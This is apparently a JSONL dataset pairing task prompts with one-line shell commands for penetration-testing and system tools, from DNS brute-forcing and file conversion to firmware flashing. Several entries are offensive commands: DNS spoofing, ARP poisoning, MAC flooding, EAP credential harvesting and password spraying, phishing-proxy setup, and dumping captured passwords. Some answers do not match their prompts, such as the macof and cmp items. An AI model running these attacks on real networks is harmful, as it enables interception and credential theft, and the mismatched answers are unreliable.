{"input": "Perform a DNS brute-force attack on the domain \"example.com\" using a wordlist from \"words.txt\" and filter results to show only successful responses (status code \"noerror\")", "answer": "dnsx -d example.com -w words.txt -rcode noerror"}
{"input": "Perform a DNS query for the AAAA record of the domain \"example.com\" using 200 threads and limit the rate to 50 requests per second", "answer": "dnsx -d example.com -aaaa -t 200 -rl 50"}
{"input": "Execute a health check every 10 fuzz cases while fuzzing the SMTP service on the target 172.16.0.1, and keep trying until the server passes a health check", "answer": "doona.pl -m SMTP -t 172.16.0.1 -c 10 -k"}
{"input": "Convert the file `example.txt` from DOS to Unix format, ensuring the output file retains the original file's timestamp", "answer": "dos2unix -k example.txt"}
{"input": "Convert the file `config.ini` from DOS to Unix format and write the output to a new file named `config_unix.ini`", "answer": "dos2unix -n config.ini config_unix.ini"}
{"input": "Convert the file `notes.txt` from DOS to Unix format and add an additional newline at the end of the file", "answer": "dos2unix notes.txt && echo >> notes.txt"}
{"input": "Convert the file `example.txt` from Mac to Unix format, ensuring the conversion mode is set to ASCII and keeping the original file's date", "answer": "mac2unix -c ascii -k example.txt"}
{"input": "Convert the file `notes.txt` from Mac to Unix format, skip binary files, and display detailed information about the file during the process", "answer": "mac2unix -s -v notes.txt"}
{"input": "Convert the file `example.txt` from Unix to DOS format, ensuring the output file retains the original file's date", "answer": "unix2dos -k example.txt"}
{"input": "Convert the file `notes.txt` from Unix to DOS format, but skip the conversion if the file is binary", "answer": "unix2dos -s notes.txt"}
{"input": "Convert the file `input.txt` from Unix to DOS format and write the output to a new file named `output.txt`", "answer": "unix2dos -n input.txt output.txt"}
{"input": "Convert the file `report.txt` from Unix to DOS format, using the Windows code page 1252 (Western European) for the conversion", "answer": "iconv -f UTF-8 -t CP1252 report.txt | unix2dos > report_dos.txt"}
{"input": "Convert the file `notes.txt` from Unix to Mac format, but assume the input file is in UTF-16LE encoding and keep the UTF-16 encoding in the output", "answer": "iconv -f UTF-16LE -t UTF-16 notes.txt | unix2mac > notes_mac.txt"}
{"input": "Convert the file `document.txt` from Unix to Mac format, but ensure the output is written to standard output instead of modifying the original file", "answer": "unix2mac < document.txt"}
{"input": "Convert the file `config.ini` from Unix to Mac format, but use DOS code page 850 for character set conversion", "answer": "iconv -f UTF-8 -t CP850 config.ini | unix2mac > config_mac.ini"}
{"input": "Conduct a directory traversal test on a web server at 203.0.113.195 using the HTTP module with SSL enabled, and set the HTTP method to POST", "answer": "dotdotpwn -m http -h 203.0.113.195 -S -M POST"}
{"input": "Fuzz a web application at http://vulnerable.com/app with the traversal point marked by TRAVERSAL, using a time delay of 500 milliseconds between each test", "answer": "dotdotpwn -m http-url -u \"http://vulnerable.com/app?param=TRAVERSAL\" -t 500"}
{"input": "Perform a directory traversal test on a web server at 192.168.1.150, using the HTTP module, and break the test after the first vulnerability is found", "answer": "dotdotpwn -m http -h 192.168.1.150 -b"}
{"input": "Perform a directory traversal test on a web server at 172.16.254.1 using the HTTP module, and generate a report named \"report_2023.txt\"", "answer": "dotdotpwn -m http -h 172.16.254.1 -r report_2023.txt"}
{"input": "Test for directory traversal on a web server at 192.168.0.100 using the HTTP module, and continue testing even if no data is received from the host", "answer": "dotdotpwn -m http -h 192.168.0.100 -C"}
{"input": "Capture images from a pcap dump file named `capture.pcap` and display them in an X window", "answer": "driftnet -f capture.pcap"}
{"input": "Capture images from the network interface `eth0` and enable verbose output to see detailed information about the capture process", "answer": "driftnet -i eth0 -v"}
{"input": "Capture images from the network interface `eth0` and drop privileges to the user `nobody` after starting the capture", "answer": "driftnet -i eth0 -Z nobody"}
{"input": "Capture images from the network interface `eth0` and beep whenever a new image is captured", "answer": "driftnet -i eth0 -b"}
{"input": "Capture images from the network interface `eth0` and enable GTK display for the captured images", "answer": "driftnet -i eth0 -g"}
{"input": "Intercept all DNS queries on the eth0 interface and forge replies using the mappings in the file 'hosts.txt'.\"", "answer": "dnsspoof -i eth0 -f hosts.txt"}
{"input": "Intercept DNS queries on the eth0 interface and forge replies for all domains listed in the 'malicious_domains.txt' file.\"", "answer": "dnsspoof -i eth0 -f malicious_domains.txt"}
{"input": "Use `macof` to flood a network with random MAC addresses, setting the source IP as 192.168.10.1, destination IP as 192.168.10.254, target hardware address (THA) to AA:BB:CC:DD:EE:FF, and source port to 9999", "answer": "macof"}
{"input": "Flood a switched LAN with random MAC addresses, using the network interface eth2, source port 3000, and destination port 4000", "answer": "macof -i eth2"}
{"input": "Analyze SSH traffic from a previously captured packet capture file named `ssh_traffic.pcap` using sshow", "answer": "sshow -p ssh_traffic.pcap"}
{"input": "Analyze SSH traffic from a packet capture file named `traffic.pcap` with detailed output and save the results to a file named `analysis.txt`", "answer": "tshark -r traffic.pcap -Y \"ssh\" -V > analysis.txt"}
{"input": "Analyze all files in the directory `/home/user/files` using DumpsterDiver, including advanced analysis and searching for hardcoded secrets, and save the results to `output.json`", "answer": "DumpsterDiver -p /home/user/files -a -s -o output.json"}
{"input": "Enable MAC address whitelisting using the file \"whitelist.txt\" and set the access point's IP to 192.168.1.100", "answer": "eaphammer --mac-whitelist whitelist.txt --lhost 192.168.1.100"}
{"input": "Perform an EAP spray attack using the password \"Password123\" against the user list \"users.txt\" on the ESSID \"SecureNetwork\"", "answer": "eaphammer --eap-spray -e SecureNetwork --user-list users.txt --password Password123"}
{"input": "Enable debug output while running an EAP credential harvesting attack", "answer": "eaphammer --creds --debug"}
{"input": "Run the captive portal server as a standalone service on port 8080", "answer": "eaphammer --captive-portal-server-only --lport 8080"}
{"input": "Conduct a dictionary attack against EAP-MD5 using a packet capture file \"capture.pcap\" and the wordlist \"rockyou.txt\"", "answer": "eapmd5pass -r capture.pcap -w rockyou.txt"}
{"input": "Run a dictionary attack against EAP-MD5 using the packet capture file \"network.pcap\", the wordlist \"passwords.lst\", and increase verbosity to level 2", "answer": "eapmd5pass -r network.pcap -w passwords.lst -v -v"}
{"input": "Run a dictionary attack against EAP-MD5 using the packet capture file \"data.pcap\", the wordlist \"top1000.txt\", and target the EAP ID \"0x12\"", "answer": "eapmd5pass -r data.pcap -w top1000.txt -E 0x12"}
{"input": "Conduct a dictionary attack against EAP-MD5 using the packet capture file \"traffic.pcap\", the wordlist \"dictionary.txt\", and display the version information of the tool", "answer": "eapmd5pass -r traffic.pcap -w dictionary.txt -V"}
{"input": "Run a dictionary attack against EAP-MD5 using the packet capture file \"test.pcap\", the wordlist \"words.txt\", and target the username \"user123\" with the challenge \"12345678\" and response \"87654321\"", "answer": "eapmd5pass -r test.pcap -w words.txt -U user123 -C 12345678 -R 87654321"}
{"input": "Delete all resources associated with the EKS cluster named \"my-cluster\"", "answer": "eksctl delete cluster --name my-cluster"}
{"input": "Scrape online services for phone number digits associated with the email address \"contact@service.com\" and set a timeout of 10 seconds for each request", "answer": "email2phonenumber scrape contact@service.com --timeout 10"}
{"input": "Conduct a detailed enumeration on the IP 10.10.10.5 to extract user lists and share lists with verbose output to see the full commands being executed", "answer": "enum4linux -U -S -v 10.10.10.5"}
{"input": "Retrieve detailed user and group information from the target IP 192.168.1.100 using enum4linux-ng, and save the output to a JSON file named \"enum_results.json\"", "answer": "enum4linux-ng -A -d -oJ enum_results.json 192.168.1.100"}
{"input": "Retrieve the password policy information from the target IP 192.168.1.100 using enum4linux-ng, and authenticate with the username \"admin\" and password \"password123\"", "answer": "enum4linux-ng -P -u admin -p password123 192.168.1.100"}
{"input": "Enumerate users and groups on the target IP 192.168.1.100 using enum4linux-ng, and specify a custom RID range from 1000 to 2000", "answer": "enum4linux-ng -U -G -r 1000-2000 192.168.1.100"}
{"input": "Enumerate IAX usernames on the target 10.10.10.5 with a minimum username length of 3 characters and a maximum length of 8 characters", "answer": "enumiax -m 3 -M 8 10.10.10.5"}
{"input": "Increase verbosity while enumerating IAX usernames on the target 172.16.254.1", "answer": "enumiax -v 172.16.254.1"}
{"input": "Disable TCP segmentation offload (TSO) for the network interface `eth6`", "answer": "ethtool -K eth6 tso off"}
{"input": "Restart auto-negotiation on the network interface `eth9`", "answer": "ethtool -r eth9"}
{"input": "Blink the LED on the network interface `eth10` for 10 seconds to identify it physically", "answer": "ethtool -p eth10 10"}
{"input": "Set the number of combined channels for the network interface `eth19` to 8", "answer": "ethtool -L eth19 combined 8"}
{"input": "Perform a silent ARP poisoning attack on the targets `192.168.1.10` and `192.168.1.20` without displaying packet contents", "answer": "ettercap -T -M arp:remote /192.168.1.10/ /192.168.1.20/ -q"}
{"input": "Compile a source filter file named `filter.ecf` while enabling debug messages during the compilation process", "answer": "etterfilter -d filter.ecf"}
{"input": "Compile a source filter file named `filter.ecf` and save the output to a binary file named `custom_filter.ef`", "answer": "etterfilter filter.ecf -o custom_filter.ef"}
{"input": "Test a compiled filter file named `filter.ef` and display its instructions in a human-readable format while enabling debug messages", "answer": "etterfilter -t filter.ef -d"}
{"input": "Compile a source filter file named `filter.ecf` with maximum debug output and save the binary output to `debug_filter.ef`", "answer": "etterfilter -ddd filter.ecf -o debug_filter.ef"}
{"input": "Display all collected usernames and passwords from the log file `dump.eci`", "answer": "etterlog -p dump.eci"}
{"input": "Display information about remote hosts from the log file `dump.eci`", "answer": "etterlog -L dump.eci"}
{"input": "Test and analyze a compiled filter file named `filter.ef` to display its instructions in a human-readable format", "answer": "etterfilter -t filter.ef"}
{"input": "Filter and display only packets in `dump.ecp` that are related to the IP address `10.0.0.1`", "answer": "tshark -r dump.ecp -Y \"ip.addr == 10.0.0.1\""}
{"input": "Display information about local hosts from the log file `dump.eci`", "answer": "etterlog -l dump.eci"}
{"input": "Start evil-ssdp on the eth0 interface, use the \"office365\" template, and specify the SMB server IP as 10.0.0.5", "answer": "evil_ssdp.py eth0 -t office365 -s 10.0.0.5"}
{"input": "Connect to the remote Windows host at IP 192.168.1.100 using the username \"admin\" and password \"P@ssw0rd\" over SSL", "answer": "evil-winrm -i 192.168.1.100 -u admin -p P@ssw0rd -S"}
{"input": "Connect to the remote Windows host at IP 172.16.20.30 using the username \"administrator\" and password \"Admin123\" while specifying a custom user-agent \"Mozilla/5.0\"", "answer": "evil-winrm -i 172.16.20.30 -u administrator -p Admin123"}
{"input": "Connect to the remote Windows host at IP 192.168.56.101 using the username \"user1\" and password \"Password123\" while loading PowerShell scripts from the local directory \"/home/user/scripts\"", "answer": "evil-winrm -i 192.168.56.101 -u user1 -p Password123 -s /home/user/scripts"}
{"input": "Connect to the remote Windows host at IP 10.0.0.50 using the username \"testuser\" and password \"TestPass123\" while specifying a custom WinRM endpoint \"/custom_wsman\"", "answer": "evil-winrm -i 10.0.0.50 -u testuser -p TestPass123 -U /custom_wsman"}
{"input": "Connect to the remote Windows host at IP 10.10.15.20 using the username \"user2\" and password \"Pass1234\" while specifying a custom Kerberos realm \"EXAMPLE.COM\"", "answer": "evil-winrm -i 10.10.15.20 -u user2 -p Pass1234 -r EXAMPLE.COM"}
{"input": "Connect to the remote Windows host at IP 192.168.1.150 using the username \"admin\" and password \"AdminPass123\" while specifying a custom SPN prefix \"HTTP/customhost\"", "answer": "evil-winrm -i 192.168.1.150 -u admin -p AdminPass123 --spn HTTP/customhost"}
{"input": "Specify a custom configuration directory located at `/opt/evilginx/config` for evilginx2", "answer": "evilginx2 -c /opt/evilginx/config"}
{"input": "Start evilginx2 with debug output enabled and specify a custom configuration directory at `/etc/evilginx`", "answer": "evilginx2 -debug -c /etc/evilginx"}
{"input": "Use exifprobe to list all metadata from \"vacation.jpg\", printing tag numbers and values in hexadecimal, and use color to highlight sections", "answer": "exifprobe -X -c -L vacation.jpg"}
{"input": "Print all metadata (Exif, IPTC, and XMP) from the image file \"landscape.jpg\" but only show tags that contain the word \"camera\" (case insensitive)", "answer": "exiv2 -pa -g camera/i landscape.jpg"}
{"input": "Generate an Expect script by interacting with an FTP session to `ftp.example.com` and save the output to a file named `ftp_session.exp`", "answer": "autoexpect -f ftp_session.exp ftp ftp.example.com"}
{"input": "Generate an Expect script in prompt mode to ignore variable output like timestamps or dynamic data", "answer": "autoexpect -p"}
{"input": "Generate an Expect script for a custom program `my_program` with arguments `arg1` and `arg2`, and save the output to `my_script.exp`", "answer": "autoexpect -f my_script.exp my_program arg1 arg2"}
{"input": "Generate an Expect script for a custom program `my_tool` with arguments `--option1` and `--option2`, and save the output to `tool_session.exp`", "answer": "autoexpect -f tool_session.exp my_tool --option1 --option2"}
{"input": "Automate an interactive SSH login to the host 192.168.1.10 using the username \"admin\" and password \"password123\" with an Expect script", "answer": "expect -c 'spawn ssh admin@192.168.1.10; expect \"password:\"; send \"password123\\r\"; interact'"}
{"input": "Automate a sequence of commands in an interactive program using an Expect script, but read the script from standard input instead of a file", "answer": "cat automate.exp | expect -"}
{"input": "Start a kibitz session with user2, but run it without an underlying process, allowing characters to be passed directly between users", "answer": "kibitz -noproc user2"}
{"input": "Generate a new password using `expect_mkpasswd` with all default settings", "answer": "mkpasswd"}
{"input": "Start multiple xterms with the command \"ssh %n\" for hosts \"host1\" and \"host2\"", "answer": "multixterm -xc \"ssh %n\" host1 host2"}
{"input": "Connect to the remote host `192.168.4.50` using `expect_rlogin-cwd` with verbose output and set the working directory to `/var/www/html`", "answer": "expect_rlogin-cwd -v 192.168.4.50 /var/www/html"}
{"input": "Run a timed execution of the `ssh` command to connect to the host `192.168.1.100` with a timeout of 10 seconds", "answer": "timeout 10 ssh 192.168.1.100"}
{"input": "Execute a timed run of the `ftp` command to connect to the server `ftp.example.com` with a timeout of 15 seconds", "answer": "timeout 15 ftp ftp.example.com"}
{"input": "Execute a timed run of the `ping` command to check connectivity to `8.8.8.8` with a timeout of 5 seconds", "answer": "timeout 5 ping 8.8.8.8"}
{"input": "Use a local active file `/tmp/active` instead of querying an NNTP server for testing purposes", "answer": "tknewsbiff /tmp/active"}
{"input": "Configure `tknewsbiff` to use a custom `.newsrc` file located at `~/.newsrc-custom`", "answer": "tknewsbiff -newsrc ~/.newsrc-custom"}
{"input": "Start a shared terminal session with `expect_xkibitz` using the `-ignore` and `-nottyinit` flags to ignore errors and avoid initializing terminal settings", "answer": "expect_xkibitz -ignore -nottyinit"}
{"input": "Start a kibitz session with user2, but do not run any underlying process. Just pass characters directly between the two terminals.\"", "answer": "kibitz -noproc user2"}
{"input": "Start a kibitz session with user2, but ensure the shell used is `/bin/zsh` instead of the default shell.\"", "answer": "kibitz user2 /bin/zsh"}
{"input": "Use multixterm to start xterms with a custom geometry of 80x20 and run the command \"top\" on hosts \"node1\" and \"node2\"", "answer": "multixterm -xa \"-geometry 80x20\" -xc \"top\" node1 node2"}
{"input": "Launch multixterm with a custom command directory and start xterms running the command \"ls -l\" on hosts \"dev1\" and \"dev2\"", "answer": "multixterm -xd \"/path/to/custom/dir\" -xc \"ls -l\" dev1 dev2"}
{"input": "Run the `ls` command with a timeout of 5 seconds to list the contents of the `/var/log` directory", "answer": "timeout 5 ls /var/log"}
{"input": "Use `timed-run` to execute a long-running `curl` command to download a file from `http://example.com/file.zip` with a timeout of 30 seconds", "answer": "timed-run -t 30 curl -O http://example.com/file.zip"}
{"input": "Run tknewsbiff to monitor newsgroups on the server `news.example.org` and use a custom active file located at `/path/to/active`.\"", "answer": "tknewsbiff -s news.example.org -a /path/to/active"}
{"input": "Unbuffer the output of a command that continuously monitors a log file for new entries, ensuring the output is not buffered", "answer": "unbuffer tail -f /var/log/syslog"}
{"input": "Unbuffer the output of a command that pings a remote server, ensuring the output is not buffered", "answer": "unbuffer ping 8.8.8.8"}
{"input": "Unbuffer the output of a command that runs a Python script, ensuring the output is not buffered", "answer": "unbuffer python3 script.py"}
{"input": "Unbuffer the output of a command that compiles a C program, ensuring the output is not buffered", "answer": "unbuffer gcc -o program program.c"}
{"input": "Unbuffer the output of a command that runs a long-running process, ensuring the output is not buffered", "answer": "unbuffer ./long_running_process"}
{"input": "Unbuffer the output of a command that runs a shell script, ensuring the output is not buffered", "answer": "unbuffer ./script.sh"}
{"input": "Unbuffer the output of a command that runs a network scan, ensuring the output is not buffered", "answer": "unbuffer nmap -sP 192.168.1.0/24"}
{"input": "Unbuffer the output of a command that runs a database query, ensuring the output is not buffered", "answer": "unbuffer mysql -u root -p -e \"SELECT * FROM database.table\""}
{"input": "Unbuffer the output of a command that runs a system update, ensuring the output is not buffered", "answer": "unbuffer apt-get update"}
{"input": "Launch an xkibitz session with no terminal initialization and no echoing of commands", "answer": "xkibitz -nottyinit -noecho"}
{"input": "Start an xkibitz session with no terminal initialization, no echoing, and keep the terminal open after the session", "answer": "xkibitz -nottyinit -noecho -leaveopen"}
{"input": "Launch an xkibitz session with a PTY, disable terminal copying, and suppress command echoing", "answer": "xkibitz -pty -nottycopy -noecho"}
{"input": "Search for all exploits in the Exploit Database that match the keyword \"Apache\"", "answer": "searchsploit -t Apache"}
{"input": "Search for all exploits in the Exploit Database that are related to buffer overflow vulnerabilities", "answer": "searchsploit -t \"buffer overflow\""}
{"input": "Search for all exploits in the Exploit Database that are related to file inclusion vulnerabilities", "answer": "searchsploit -t \"file inclusion\""}
{"input": "Search for all exploits in the Exploit Database that are related to command injection vulnerabilities", "answer": "searchsploit -t \"command injection\""}
{"input": "Search for all exploits in the Exploit Database that are related to insecure deserialization vulnerabilities", "answer": "searchsploit -t \"insecure deserialization\""}
{"input": "Search for all exploits related to \"Microsoft Exchange\" and display the results without any color highlighting", "answer": "searchsploit --disable-colour \"Microsoft Exchange\""}
{"input": "List all available papers and ezines in the Exploit Database archive", "answer": "exploitdb-papers -a"}
{"input": "Search for papers related to \"buffer overflow\" in the Exploit Database archive", "answer": "exploitdb-papers -s \"buffer overflow\""}
{"input": "Show all deleted entries from the ext3 filesystem on `/dev/sdb2`.\"", "answer": "ext3grep /dev/sdb2 --deleted"}
{"input": "Recover a specific deleted file named `report.txt` from the ext3 filesystem on `/dev/sdc1`.\"", "answer": "ext3grep /dev/sdc1 --restore-file 'report.txt'"}
{"input": "Recover all deleted files from the ext4 filesystem at `/dev/sdd1` and save them to `/mnt/recovery`, while also specifying a time range for the recovery between timestamps 1638316800 and 1638403200", "answer": "ext4magic -M -d /mnt/recovery -t 1638316800-1638403200 /dev/sdd1"}
{"input": "Attempt to restore all deleted files from the ext4 partition located at `/dev/sda1`", "answer": "extundelete --restore-all /dev/sda1"}
{"input": "Restore the inode `12345` from the ext3 partition `/dev/sdf1` and save the recovered file to `/mnt/recovered_files`", "answer": "extundelete --restore-inode 12345 -o /mnt/recovered_files /dev/sdf1"}
{"input": "Print the contents of the superblock and journal from the ext4 partition `/dev/sdg1`", "answer": "dumpe2fs -h /dev/sdg1"}
{"input": "Capture screenshots of all URLs listed in the file `urls.txt` and save the report in a directory named `report_output`", "answer": "eyewitness --web -f urls.txt -d report_output"}
{"input": "Take a screenshot of a single URL `https://example.com` and save the results in a directory called `single_url_report`", "answer": "eyewitness --web --single https://example.com -d single_url_report"}
{"input": "Process an Nmap XML file `scan_results.xml` to capture screenshots of all discovered web services and save the report in a directory named `nmap_report`", "answer": "eyewitness --web -x scan_results.xml -d nmap_report"}
{"input": "Capture screenshots of URLs from `urls.txt` using 5 threads, with a delay of 3 seconds between requests, and save the report in `threaded_report`", "answer": "eyewitness --web -f urls.txt --threads 5 --delay 3 -d threaded_report"}
{"input": "Capture screenshots of URLs from `urls.txt` while using a SOCKS5 proxy at `127.0.0.1:8080` and save the report in `proxy_report`", "answer": "eyewitness --web -f urls.txt --proxy-ip 127.0.0.1 --proxy-port 8080 --proxy-type socks5 -d proxy_report"}
{"input": "Capture screenshots of URLs from `urls.txt` with a custom user agent `Mozilla/5.0` and save the report in `custom_ua_report`", "answer": "eyewitness --web -f urls.txt --user-agent \"Mozilla/5.0\" -d custom_ua_report"}
{"input": "Capture screenshots of URLs from `urls.txt` with a timeout of 10 seconds per request and save the report in `timeout_report`", "answer": "eyewitness --web -f urls.txt --timeout 10 -d timeout_report"}
{"input": "Capture screenshots of URLs from `urls.txt` and prepend `https://` to any URLs that don\u2019t already have a protocol, saving the report in `prepend_report`", "answer": "eyewitness --web -f urls.txt --prepend-https -d prepend_report"}
{"input": "Capture screenshots of URLs from `urls.txt` and include additional cookies `sessionid=12345,user=admin` in the requests, saving the report in `cookies_report`", "answer": "eyewitness --web -f urls.txt --cookies \"sessionid=12345,user=admin\" -d cookies_report"}
{"input": "Start geckodriver with the Firefox binary located at `/usr/bin/firefox`, and set the WebDriver server to listen on port 5555", "answer": "geckodriver -b /usr/bin/firefox -p 5555"}
{"input": "Launch geckodriver with debug-level logging and allow connections from the host `192.168.1.100`", "answer": "geckodriver --log debug --host 192.168.1.100"}
{"input": "Run geckodriver with the Android storage location set to `sdcard` and the WebDriver server listening on port `4444`", "answer": "geckodriver --android-storage sdcard -p 4444"}
{"input": "Run geckodriver with the WebDriver server listening on port `4444` and allow connections from the host `192.168.1.200`", "answer": "geckodriver -p 4444 --host 192.168.1.200"}
{"input": "Run the Faraday dispatcher with default settings to start the service", "answer": "faraday-dispatcher run"}
{"input": "Configure Faraday dispatcher to use a specific configuration file located at `/etc/faraday/config.ini`", "answer": "faraday-dispatcher run --config /etc/faraday/config.ini"}
{"input": "Start Faraday dispatcher and bind it to a specific IP address and port for network communication", "answer": "faraday-dispatcher run --host 192.168.1.100 --port 8080"}
{"input": "Run Faraday dispatcher with verbose output to monitor detailed execution logs", "answer": "faraday-dispatcher run --verbose"}
{"input": "List all workspaces in Faraday", "answer": "faraday-cli workspace list"}
{"input": "Show all vulnerabilities found in the workspace named \"Internal_Network\"", "answer": "faraday-cli vuln list --workspace Internal_Network"}
{"input": "Create a new workspace named \"External_Scan\" in Faraday", "answer": "faraday-cli workspace create --name External_Scan"}
{"input": "Update the status of all vulnerabilities in the workspace \"Quarterly_Review\" to \"closed\"", "answer": "faraday-cli vuln update --workspace Quarterly_Review --status closed"}
{"input": "Retrieve detailed information about all hosts in the workspace \"Annual_Checkup\"", "answer": "faraday-cli host list --workspace Annual_Checkup --details"}
{"input": "List all files and directories, including deleted ones, in the root directory of the FAT filesystem image `disk.img`", "answer": "fatcat disk.img -l / -d"}
{"input": "Extract all files, including deleted ones, from the FAT filesystem image `disk.img` to the directory `/home/user/extracted_files`", "answer": "fatcat disk.img -x /home/user/extracted_files -d"}
{"input": "Display detailed information about the FAT filesystem image `disk.img`", "answer": "fatcat disk.img -i"}
{"input": "Read the contents of the file located at `/documents/report.txt` in the FAT filesystem image `disk.img`", "answer": "fatcat disk.img -r /documents/report.txt"}
{"input": "Backup the FAT tables from the FAT filesystem image `disk.img` to a file named `fat_backup.bin`", "answer": "fatcat disk.img -b fat_backup.bin"}
{"input": "Crack a ZIP file named \"archive.zip\" using brute force, checking passwords between 3 and 5 characters long, and displaying verbose output", "answer": "fcrackzip -b -l 3-5 -v archive.zip"}
{"input": "Display detailed information about the contents of the zip file `archive.zip`", "answer": "unzip -l archive.zip"}
{"input": "Analyze the structure of a large zip file named `backup.zip` to see its contents and compression details", "answer": "unzip -l backup.zip"}
{"input": "Display information about a zip file named `project_files.zip` located on a remote server accessed via SSH", "answer": "ssh user@remote_server \"unzip -l project_files.zip\""}
{"input": "Scan the target URL `http://example.com` with a maximum recursion depth of 3, and include only `.php` and `.html` file extensions", "answer": "feroxbuster -u http://example.com -d 3 -x php -x html"}
{"input": "Run a scan on `http://example.com` with 100 threads and allow the client to follow redirects", "answer": "feroxbuster -u http://example.com -t 100 -r"}
{"input": "Scan `http://example.com` with a custom User-Agent `Mozilla/5.0` and include only status codes 200, 301, and 302 in the results", "answer": "feroxbuster -u http://example.com -a \"Mozilla/5.0\" -s 200 301 302"}
{"input": "Perform a scan on `http://example.com` while automatically discovering file extensions and adding them to the scan", "answer": "feroxbuster -u http://example.com -E"}
{"input": "Perform a scan on `http://example.com` while sending all 200 and 302 responses through a replay proxy at `http://127.0.0.1:8080`", "answer": "feroxbuster -u http://example.com --replay-proxy http://127.0.0.1:8080 --replay-codes 200 302"}
{"input": "Scan `http://example.com` with a custom wordlist located at `/path/to/wordlist.txt` and disable recursion", "answer": "feroxbuster -u http://example.com -w /path/to/wordlist.txt -n"}
{"input": "Perform a scan on `http://example.com` while automatically tuning the scan rate based on encountered errors", "answer": "feroxbuster -u http://example.com --auto-tune"}
{"input": "Scan `http://example.com` with a custom header `Authorization: Bearer token123` and include only `.js` and `.css` file extensions", "answer": "feroxbuster -u http://example.com -H \"Authorization: Bearer token123\" -x js -x css"}
{"input": "Analyze offline packet capture files named \"capture1.pcap\" and \"capture2.pcap\" using ferret-sidejack", "answer": "ferret-sidejack -r capture1.pcap capture2.pcap"}
{"input": "Analyze multiple packet capture files named \"file1.pcap\", \"file2.pcap\", and \"file3.pcap\" using ferret-sidejack", "answer": "ferret-sidejack -r file1.pcap file2.pcap file3.pcap"}
{"input": "Conduct a full reconnaissance on the target website \"example.com\" using FinalRecon, but hide the banner and use a custom wordlist located at \"/usr/share/wordlists/custom.txt\"", "answer": "finalrecon --url example.com --full -nb -w /usr/share/wordlists/custom.txt"}
{"input": "Perform a full reconnaissance on the target website \"example.com\" using FinalRecon, but disable SSL verification and allow redirects", "answer": "finalrecon --url example.com --full -s -r"}
{"input": "Perform a full reconnaissance on the target website \"example.com\" using FinalRecon, and specify a custom DNS server \"8.8.8.8\" for DNS enumeration", "answer": "finalrecon --url example.com --full -d 8.8.8.8"}
{"input": "Conduct a full reconnaissance on the target website \"example.com\" using FinalRecon, and set the request timeout to 60 seconds", "answer": "finalrecon --url example.com --full -T 60"}
{"input": "Perform a full reconnaissance on the target website \"example.com\" using FinalRecon, and specify file extensions \"php, html, js\" for directory search", "answer": "finalrecon --url example.com --full -e php,html,js"}
{"input": "Enumerate all subdomains for the target domain \"example.com\" and save the results to an automatically generated output file", "answer": "findomain -t example.com -o"}
{"input": "Enumerate subdomains for \"example.com\" and check the HTTP status of each subdomain", "answer": "findomain -t example.com --http-status"}
{"input": "Enumerate subdomains for \"example.com\" and exclude subdomains containing the string \"test.\"", "answer": "findomain -t example.com | grep -v 'test'"}
{"input": "Enumerate subdomains for \"example.com\" and filter the results to only include subdomains containing the string \"api.\"", "answer": "findomain -t example.com | grep 'api'"}
{"input": "Enumerate subdomains for \"example.com\" and use a custom list of DNS resolvers from a file named \"resolvers.txt.\"", "answer": "findomain -t example.com --resolvers resolvers.txt"}
{"input": "Enumerate subdomains for \"example.com\" and disable wildcard detection when resolving subdomains", "answer": "findomain -t example.com --no-wildcards"}
{"input": "Enumerate subdomains for \"example.com\" and enable verbose mode to debug any issues", "answer": "findomain -t example.com -v"}
{"input": "Enumerate subdomains for \"example.com\" and enable port scanning for discovered subdomains", "answer": "findomain -t example.com --pscan"}
{"input": "Enumerate subdomains for \"example.com\" and import additional subdomains from a file named \"import.txt.\"", "answer": "findomain -t example.com --import-subdomains import.txt"}
{"input": "Enumerate subdomains for \"example.com\" and query the Findomain database for previously discovered subdomains", "answer": "findomain -t example.com --query-database"}
{"input": "Enumerate subdomains for \"example.com\" and reset the Findomain database before starting the enumeration", "answer": "findomain -t example.com --reset-database"}
{"input": "Enumerate subdomains for \"example.com\" and use a configuration file named \"config.toml\" for additional settings", "answer": "findomain -t example.com -c config.toml"}
{"input": "Read the contents of the flash chip and save it to a file named `backup.bin`", "answer": "flashrom -p internal -r backup.bin"}
{"input": "Disable write protection on the flash chip using the internal programmer", "answer": "flashrom -p internal --wp-disable"}
{"input": "Show the write protection status of the flash chip using the internal programmer", "answer": "flashrom -p internal --wp-status"}
{"input": "Probe for flash chips using the internal programmer and output verbose details", "answer": "flashrom -p internal -VVV"}
{"input": "Read the flash chip's name and size using the internal programmer", "answer": "flashrom -p internal"}
{"input": "Write the contents of `firmware.bin` to a specific region defined in `layout.txt` using the internal programmer", "answer": "flashrom -p internal -l layout.txt -w firmware.bin"}
{"input": "Force a write operation to the flash chip using the internal programmer, even if it is risky", "answer": "flashrom -p internal -w firmware.bin -f"}
{"input": "Recover all file types from the disk image `corrupted.img`, including corrupted files, and save the output to the directory `recovered_data`, while suppressing all output messages", "answer": "foremost -Q -a -i corrupted.img -o recovered_data"}
{"input": "Extract all file types from the disk image `archive.img`, save the results to the directory `extracted_files`, and use a custom configuration file `custom.conf` for the recovery process", "answer": "foremost -a -i archive.img -o extracted_files -c custom.conf"}
{"input": "Recover all file types from the disk image `data.img`, save the output to the directory `recovered_data`, and skip the first 1000 blocks of the disk image during the search", "answer": "foremost -a -i data.img -o recovered_data -s 1000"}
{"input": "Compare the files `document1.pdf` and `document2.pdf` with a block size of 512 bytes", "answer": "cmp -b 512 document1.pdf document2.pdf"}
{"input": "List all auxiliary modules in framework2", "answer": "msfconsole -q -x 'search type:auxiliary; exit'"}
{"input": "Start FreeRADIUS and ensure the PID is always written, even when running in the foreground", "answer": "freeradius -f -P"}
{"input": "Run FreeRADIUS without spawning child processes to handle requests", "answer": "freeradius -s"}
{"input": "Reset the counter for all users in the FreeRADIUS rlm_counter database file `/var/log/freeradius/counter.db` to 3600 seconds", "answer": "sqlite3 /var/log/freeradius/counter.db \"UPDATE counters SET value = 3600;\""}
{"input": "Create an SQL IP pool named \"vpn_pool\" with an IP range from 10.10.10.1 to 10.10.10.254, using the table \"vpn_ips\", the SQLite dialect, and a capacity limit of 200 IPs", "answer": "rlm_sqlippool_tool -p vpn_pool -s 10.10.10.1 -e 10.10.10.254 -t vpn_ips -d sqlite -c 200"}
{"input": "Send an accounting request to the RADIUS server at 192.168.1.100 on port 1813 using IPv4, with the shared secret \"accounting456\", and retry 3 times if there is a timeout", "answer": "radclient -4 -r 3 192.168.1.100:1813 acct accounting456"}
{"input": "Generate a password hash using the MD5 algorithm for the password \"secure123\"", "answer": "echo -n 'secure123' | md5sum"}
{"input": "Send an authentication request to the RADIUS server at 10.10.10.10, using IPv4, with no output printed to the console, and send 5 packets in parallel", "answer": "radeapclient -4 -q -p 5 10.10.10.10 auth"}
